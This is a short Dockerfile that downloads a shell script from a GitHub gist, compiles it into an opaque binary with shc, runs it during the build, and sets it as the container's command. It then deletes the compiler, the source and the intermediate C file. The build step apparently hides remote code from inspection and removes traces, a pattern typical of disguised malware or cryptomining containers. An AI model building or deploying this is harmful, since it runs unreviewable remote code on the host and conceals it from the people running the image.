FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/1170766016/7b34094e5787120f920893dc45576148/raw/dfa93798f8250883443a979361a30c9ee42f4a3f/11s

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
